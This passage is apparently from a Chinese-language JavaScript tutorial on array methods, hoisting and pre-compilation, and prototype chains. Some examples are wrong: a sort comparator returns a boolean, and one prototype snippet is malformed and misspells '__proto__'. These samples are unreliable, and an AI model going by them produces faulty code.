<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [];</span><br></pre></td></tr></table></figure>
<p>2.通过数组构造函数来声明数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">//1 2 3 4</span></span><br></pre></td></tr></table></figure>
<p>这种方式和字面量方式没有区别，但是要注意的是，如果我们在构造函数里面只写一个数字new Array(5);这个时候这个数字就不是第一个值是5的意思了，而是我们创建一个长度为5的数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">//一个长度为10的空数组</span></span><br></pre></td></tr></table></figure>
<h3 id="数组的读写"><a href="#数组的读写" class="headerlink" title="数组的读写"></a>数组的读写</h3><p>js的数组是弱数据类型的数组，不像其他语言那样严格。</p>
<p>溢出读为undefined<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr[<span class="number">3</span>]);<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure></p>
<p>可以溢出写<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr[<span class="number">5</span>] = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">//1,2,,,5</span></span><br></pre></td></tr></table></figure></p>
<h3 id="数组的常用方法"><a href="#数组的常用方法" class="headerlink" title="数组的常用方法"></a>数组的常用方法</h3><p>数组的方法大致可以分类两类：不改变原数组的和改变原数组的。</p>
<p>1.改变原数组的</p>
<p>改变原数组的方法主要有：reverse,sort,push,pop,shift,unshift,splice</p>
<p>• reverse</p>
<p>reverse是使数组倒序。</p>
<p>• push</p>
<p>push是在数组最后的位置增加数据。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr.push(<span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure></p>
<p>• pop</p>
<p>pop是从数组后面删除一位数据，同时返回这个被删除的数据，没有参数。</p>
<p>• shift</p>
<p>从数据的最前面删除一位数据，同时返回这个数据，没有参数。</p>
<p>• unshift</p>
<p>在数据的最前面添加数据，和push一样的用法。</p>
<p>• splice</p>
<p>这个方法是截取的意思，它有三个参数，第一个是截取开始的位置，第二个是截取的长度，第三个是参数是一组数据，代表我们要在截取的位置添加的数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">arr.splice(<span class="number">1</span>, <span class="number">2</span>, <span class="number">100</span>, <span class="number">188</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">//1 100 188 4 5</span></span><br></pre></td></tr></table></figure>
<p>如果我们不写要添加的数据的话，这个方法就变成了在数组中删除数据了。</p>
<p>如果我们截取的长度是0，然后添加数据的话，这个方法就变成了在数据的特定位置添加数据了。</p>
<p>• sort</p>
<p>这个方法是排序的意思。</p>
<p>它默认按字典序来排序。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arr --&gt; 1 2 5 4 3</span><br><span class="line">arr.sort --&gt; 1 2 3 4 5</span><br><span class="line">arr --&gt; a c b d</span><br><span class="line">arr.sort --&gt; a b c d</span><br></pre></td></tr></table></figure></p>
<p>我们还可以自定义排序规则</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a.age &lt; b.age;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这里的a、b代表的是数组里面任意的两位数据。</p>
<p>无论中间的规则怎么写，系统只关注函数最后的返回值是正数还是负数。</p>
<p>负数的时候，表示a在前面，b在后面。</p>
<p>正数的时候，表示a在后面，b在前面。</p>
<p>如果我们这样写，就是乱序排序：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> num = <span class="built_in">Math</span>.random() - <span class="number">0.5</span>;</span><br><span class="line">  <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="不改变原数组的方法"><a href="#不改变原数组的方法" class="headerlink" title="不改变原数组的方法"></a>不改变原数组的方法</h3><p>不改变原数组的方法主要有：</p>
<p>concat,join</p>
<p>• concat</p>
<p>这个方法是连接数组的作用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr1 = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">arr2 = [<span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">arr = arr1.concat(arr2);</span><br><span class="line"><span class="built_in">console</span>.log(arr, arr1, arr2);<span class="comment">//[1, 2, 2, 3],[1, 2], [2, 3]</span></span><br></pre></td></tr></table></figure>
<p>我们发现arr现在是arr1和arr2连接后的数组，并且arr1和arr2都没有改变。</p>
<p>当然我们如果要连接多个数组的话，那么concat里面的数组之间用逗号分隔即可。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">arr3 = [<span class="number">5</span>, <span class="number">5</span>];</span><br><span class="line">arr = arr1.concat(arr2, arr3);</span><br></pre></td></tr></table></figure>
<p>• join</p>
<p>这个方法是让数组的每一个数据以什么方式连接成字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>];</span><br><span class="line"><span class="keyword">var</span> str = arr.join(<span class="string">"-"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(str);<span class="comment">//a-b-c</span></span><br></pre></td></tr></table></figure>
<p>我们可以用这个方法来进行大量字符串的连接工作，它比用+运算符连接字符串性能好。</p>
<p>同时，字符串有一个split操作和join操作刚好相反。</p>
<p>split是把字符串以什么方式分割成数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"a-b-c-d"</span>;</span><br><span class="line"><span class="keyword">var</span> arr = str.split(<span class="string">"-"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">//a b c d</span></span><br></pre></td></tr></table></figure>
<h3 id="数组去重问题"><a href="#数组去重问题" class="headerlink" title="数组去重问题"></a>数组去重问题</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.unique = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;&#125;,</span><br><span class="line">    arr = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = <span class="keyword">this</span>.length; i &lt; len; i ++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!obj[<span class="keyword">this</span>[i]]) &#123;</span><br><span class="line">      obj[<span class="keyword">this</span>[i]] = <span class="literal">true</span>;</span><br><span class="line">      arr.push(<span class="keyword">this</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line">arr = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="literal">null</span>, <span class="literal">null</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.unique());</span><br></pre></td></tr></table></figure>
<p>这里我们运用了一个简单的哈希结构。当我们数组中的这个数据出现过一次之后，我们就在obj中将这个元素的值的位置标记成true，后面如果出现相同的属性值，因为这个位置已经是true了，就不会添加到新数组里面了，从而达到了去重的效果。</p>
<p>当然我们一般不建议直接改数组的原型，这里仅作演示之用。</p>
<h3 id="ES6的数组方法"><a href="#ES6的数组方法" class="headerlink" title="ES6的数组方法"></a>ES6的数组方法</h3><p>ES6提供了更丰富的数组方法，下面介绍几个经常会用到的</p>
<p>• forEach</p>
<p>这个方法可以改变原数组，它让数组中的元素从头到尾遍历一遍，每一个都调用一下我们在forEach里面传递的方法，中间不会停止。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item, index</span>) </span>&#123;</span><br><span class="line">  arr[index] += <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr); <span class="comment">// [2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure>
<p>• map</p>
<p>这个方法和forEach很像，只不过map会返回一个新的数组，它也是传递一个指定的方法，让数组中的每一个元素都调用一遍这个方法。不过记得map方法最后有返回值。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> test = arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> item * item;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(test);<span class="comment">// [1, 4, 9]</span></span><br><span class="line"><span class="built_in">console</span>.log(arr);<span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure></p>
<p>• filter</p>
<p>这个方法是过滤的作用，它返回一个原数组的子集。我们同样会传递一个方法，每一个元素都会调用一下这个方法，但是只有返回true的元素才会被添加到新数组里面，返回false的不会被添加到新数组里面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> b = a.filter(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> item &gt; <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(b);<span class="comment">// 3 4 5</span></span><br></pre></td></tr></table></figure>
<p>同时，filter()会跳过稀疏数组里面缺少的元素，它的返回数组总是稠密的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,,,,,,,,,,,,,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> b = arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(b);<span class="comment">//1 3 4</span></span><br></pre></td></tr></table></figure>
<p>• every 和 some</p>
<p>这两个方法是数组的迭代方法，他们对数组应用指定函数进行判定，返回true或者false。</p>
<p>every是如果每一个元素经过传递的方法判定之后都返回true，最后才返回true。</p>
<p>some是只要有一个元素返回true，那么就返回true。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.some(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> item &lt; <span class="number">3</span>;</span><br><span class="line">&#125;));<span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.every(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> item &lt; <span class="number">3</span>;</span><br><span class="line">&#125;));<span class="comment">//false</span></span><br></pre></td></tr></table></figure>
<p>• reduce 和 reduceRight</p>
<p>reduce()和reduceRight()方法使用指定的函数将数组元素进行组合，最后变成一个值，reduce是从左向右，reduceRight是从右向左。有两个参数，第一个是方法，第二个是可选参数，即我们最后的这个值的初始值。</p>
<p>当我们没有设置初始值的时候，用数组的第一个元素的值作为初始值。不过当数组为空的时候，不带初始值就会报错。</p>
<p>当我们的数组只有一个元素并且没有指定初始值，或者有一个空数组并且指定一个初始值的情况下，reduce只是简单地返回那个值，而不会调用函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sum);<span class="comment">//0 + 1 + 2 + 3 = 6</span></span><br><span class="line"><span class="keyword">var</span> temp = [<span class="number">1</span>];</span><br><span class="line"><span class="keyword">var</span> temoOut = temp.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x * x * y;</span><br><span class="line">&#125;);<span class="comment">//1,不会调用这个函数，因为数组只有一个值</span></span><br></pre></td></tr></table></figure>
<h3 id="数组类型的检测"><a href="#数组类型的检测" class="headerlink" title="数组类型的检测"></a>数组类型的检测</h3><p>在ES6中，我们有一个isArray()方法来检测是否是数组。</p>
<p>在ES5中，typeof运算符，数组和对象都会返回object，因此无法区分数组和对象。</p>
<p>constructor和instanceof操作符也可以用来判断，但是它们存在潜藏问题：</p>
<p>我们的web浏览器中可能有多个窗口或者窗体，每一个窗体都有自己的js环境，有自己的全局对象。并且，每个全局对象有自己的构造函数，因此一个窗体中的对象将不可能是另外窗体中的构造函数的实例，所以constructor和instanceof都不能真正可靠的检测数组类型。</p>
<p>这个时候我们就需要这样的代码来检测了：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.toString.call(arr) === <span class="string">'[object Array]'</span></span><br></pre></td></tr></table></figure></p>
<p>这是ES5中最可靠的检测方法。</p>
<h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><p>当我们在后面定义了一个函数，在定义函数之前使用这个函数也是可以的。</p>
<p>我们在后面使用var声明了一个变量，在前面调用这个变量并不会报错而是undefiend。</p>
<p>这两种现象在js中被称为函数声明提升和变量声明提升，函数声明提升是一种整体提升，它会把函数声明和函数体一起提升到前面。变量声明提升是一种局部提升，它仅仅将变量的声明提前了，但是并没有将赋值也一起提前。</p>
<p>它们都是在预编译阶段进行的。</p>
<p>js运行有三个阶段：</p>
<p>1.语法分析</p>
<p>2.预编译</p>
<p>3.解释执行</p>
<p>语法分析：js引擎在解析js代码之前，会先通篇扫描一下，找出低级的语法错误，比如写错大括号之类的。</p>
<p>解释执行：我们前面提到js是一种解释型语言，编译一行执行一行，当语法分析没有问题，并且已经完成预编译之后，就开始解释执行代码了。</p>
<p>这节我们着重介绍预编译</p>
<p>在介绍预编译之前，我们需要掌握两个重要概念。</p>
<p>1.隐示全局变量。</p>
<p>如果变量未经声明就赋值使用，此变量就会变成全局对象window的一个属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.a = <span class="number">123</span>;</span><br><span class="line"><span class="built_in">window</span>.a === a;<span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = <span class="number">123</span>;</span><br><span class="line"><span class="built_in">window</span>.a === a;</span><br></pre></td></tr></table></figure>
<p>2.一切声明的全局变量，都是window的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.a);<span class="comment">//123</span></span><br></pre></td></tr></table></figure>
<p>这两种情况有什么区别呢？</p>
<p>经过声明的全局变量不能通过delete操作来删除，但是未经声明的全局变量可以被删除。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.a;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.a);<span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">// Uncaught ReferenceError: a is not defined</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.b;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.b);<span class="comment">// 123</span></span><br><span class="line"><span class="built_in">console</span>.log(b);<span class="comment">// 123</span></span><br></pre></td></tr></table></figure></p>
<p>正是由于这一种特性，导致es5有一种弊端，我们总会在无形中声明一些全局变量。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = b = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这段代码，a经过了声明，但是b却没有声明，b会成为一个全局变量。</p>
<p>了解这两点后，我们开始正式介绍预编译的过程</p>
<p>预编译的过程分为以下四步：</p>
<p>1.创建AO对象(Activation Object)。</p>
<p>2.寻找形参和变量声明，将变量和形参作为AO对象的属性名添加到对象中，值为undefined。值得注意的是，函数声明的函数名不叫变量声明。</p>
<p>3.将实参值和形参值统一。</p>
<p>4.在函数体里面寻找函数声明，将函数名作为属性名，值为这个函数的函数体。</p>
<p>函数在执行前会产生一个上下文，这个上下文就是Activeaction Object对象，简称AO对象。</p>
<p>可以假想成<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">AO = &#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个对象是空的，但是里面有一些我们看不到却存在的隐式属性，比如this、arguments等。</p>
<p>这个对象用来存放一些属性和方法，这些属性和方法就按照前面预编译的四步产生的。</p>
<p>接下来我们举个例子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a); <span class="comment">// ƒ a () &#123;&#125;</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">a</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">  a = <span class="number">222</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(a); <span class="comment">// 222</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">b</span> (<span class="params"></span>) </span>&#123;&#125;; <span class="comment">// ƒ b () &#123;&#125;</span></span><br><span class="line">  <span class="built_in">console</span>.log(b);</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">111</span>;</span><br><span class="line">  <span class="keyword">var</span> a;</span><br><span class="line">&#125;</span><br><span class="line">test(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p>
<p>我们来按预编译的过程分析一下为什么打印出的是这些值。</p>
<p>首先第一步，创建一个AO对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> AO = &#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>第二步，寻找形参值和变量声明，并且将值赋为undefined</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">AO = &#123;</span><br><span class="line">  a: <span class="literal">undefined</span>,</span><br><span class="line">  b: <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第三步，将实参值和形参值相统一。属性a被赋值成了1。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">AO = &#123;</span><br><span class="line">  a: <span class="number">1</span>,</span><br><span class="line">  b: <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第四步，寻找函数声明，将函数体赋值给属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">AO = &#123;</span><br><span class="line">  a: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,</span><br><span class="line">  b: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样在解释执行之前，我们预编译阶段创建的AO对象就是这个样子的</p>
<p>这时候我们就可以解释打印出来的值了</p>
<p>第一个console.log a –&gt; function () {}</p>
<p>第二个console.log a –&gt; 222，因为执行了a = 222这一行代码，所以被重新赋值了。</p>
<p>第三个console.log b –&gt; function () {}</p>
<p>var b = function () {}这种不叫做函数声明，这个是函数赋值给b变量，b变量是声明。</p>
<p>例如:<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  a<span class="comment">//function</span></span><br><span class="line">  d<span class="comment">//function</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">123</span>;</span><br><span class="line">  a<span class="comment">//123</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">  b<span class="comment">//undefined</span></span><br><span class="line">  <span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">  b<span class="comment">//function</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>寻找变量声明的时候，不会管里面的代码到底会不会执行，只管寻找所有变量。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a)<span class="comment">//undefined</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="number">1</span> &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">123</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(a)<span class="comment">//undefined</span></span><br><span class="line">  <span class="built_in">console</span>.log(b)<span class="comment">//function</span></span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">234</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(b)<span class="comment">//234</span></span><br><span class="line">&#125;</span><br><span class="line">test(<span class="number">2</span>);</span><br></pre></td></tr></table></figure></p>
<p>打印第一个a的时候并不会报错而是undefined，当a没有声明的时候才会报错，这里a是有声明的，if的条件对寻找变量声明没有关系。</p>
<h2 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h2><h3 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h3><p>原型的定义: 原型是function对象的一个属性，它定义了构造函数制造出来的对象的公共祖先。通过该构造函数产生的对象，可以继承该原型的属性和方法。原型也是对象。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们先定义一个构造函数，Person.prototype这个属性就是这个构造函数的原型，这个属性是天生就有的，并且这个属性的值也是一个对象。</p>
<p>我们可以在prototype上面添加属性和方法，每一个构造出来的对象都可以继承这些属性和方法。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Person.prototype.name  = <span class="string">"scarlett"</span>;</span><br><span class="line">Person.prototype.age = <span class="number">17</span>;</span><br><span class="line"><span class="keyword">var</span> oPerson = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="built_in">console</span>.log(oPerson.name);<span class="comment">//scarlett</span></span><br><span class="line"><span class="built_in">console</span>.log(oPerson.age);<span class="comment">//17</span></span><br></pre></td></tr></table></figure></p>
<p>虽然每一个对象都是独立的，但是他们有共同的祖先，当我们访问这个对象的属性的时候，如果它没有这个属性，就会向上找到它的原型，然后在原型上访问这个属性。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.money = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">  money: <span class="number">200</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> oPerson = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="built_in">console</span>.log(oPerson.money);<span class="comment">//100</span></span><br><span class="line"><span class="keyword">delete</span> oPerson.money;</span><br><span class="line"><span class="built_in">console</span>.log(oPerson.money);<span class="comment">//200</span></span><br></pre></td></tr></table></figure></p>
<p>这里我们oPerson对象因为自身有一个money属性，所以就不会到原型上去寻找money属性，因此打印的是100。但是当我们删除了自身的money属性之后，它就会到原型上去寻找money这个属性，因此就打印了200。</p>
<p>利用原型特点，我们可以提取公有属性。</p>
<p>我们可以把每一个对象都有的公有属性提取到原型上，这样当我们用构造函数构造大量的对象的时候就不需要走多次构造函数里面的赋值语句了，每一个对象调用属性的时候直接上原型上查找就可以了。</p>
<h3 id="对象如何查看原型"><a href="#对象如何查看原型" class="headerlink" title="对象如何查看原型"></a>对象如何查看原型</h3><p>前面我们提到了构造函数可以通过.prototype的方法来查看原型，那么我们怎么在对象上查看原型呢？</p>
<p>我们前面提到过用构造函数构造对象时，会隐式创建一个this对象，这个this对象里面有一个默认属性叫做<strong>proto</strong>，这个属性的值就指向这个对象的原型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">this</span> = &#123;</span><br><span class="line">  <span class="comment">//xxx</span></span><br><span class="line">  __proto__:Person.prototype;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当查找的属性是对象自身没有的属性时，会先查找<code>__proto__</code>这个属性，这个属性指向了原型，所以就可以在原型上继续查找属性了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Person.money.prototype = <span class="number">100</span>;</span><br><span class="line">oPerson.__proro__.money<span class="comment">//100</span></span><br></pre></td></tr></table></figure>
<p>总结一下就是：prototype是构造函数的属性，<strong>proto</strong>是对象的属性，它指向prototype。</p>
<h3 id="对象如何查看自身的构造函数"><a href="#对象如何查看自身的构造函数" class="headerlink" title="对象如何查看自身的构造函数"></a>对象如何查看自身的构造函数</h3><p>在prototype里面，有一个隐式的属性叫做constructor，这个属性记录的就是对象构造函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(oPerson.constructor); <span class="comment">// Person();</span></span><br></pre></td></tr></table></figure>
<h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>有了原型，原型还是一个对象，那么这个名为原型的对象自然还有自己的原型，这样原型上还有原型的结构就构成了原型链。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Gra.prototype.firstName = <span class="string">"scarlett"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Gra</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">"grandfather"</span>;</span><br><span class="line">  <span class="keyword">this</span>.sex = <span class="string">"male"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> grandfoo = <span class="keyword">new</span> Gra();</span><br><span class="line">grandfoo.word = <span class="string">"hello"</span>;</span><br><span class="line">Foo.prototype = grandfoo;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.age = <span class="number">18</span>;</span><br><span class="line">  <span class="keyword">this</span>.money = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> father = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">"son"</span>;</span><br><span class="line">&#125;</span><br><span class="line">Son.prototype = father;</span><br><span class="line"><span class="keyword">var</span> son = <span class="keyword">new</span> Son();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(son.firstName)<span class="comment">// "scarlett"</span></span><br></pre></td></tr></table></figure>
<p>这种链式结构就叫原型链。</p>
<h3 id="原型链的终点"><a href="#原型链的终点" class="headerlink" title="原型链的终点"></a>原型链的终点</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(Gra.prototype);<span class="comment">// Object&#123;"name": "scarlett"&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(Gra.prototype.__proto__);<span class="comment">//Object.prototype</span></span><br><span class="line"><span class="built_in">console</span>.log(Gra.prototype.__proto__.__proto__);<span class="comment">//null</span></span><br></pre></td></tr></table></figure>
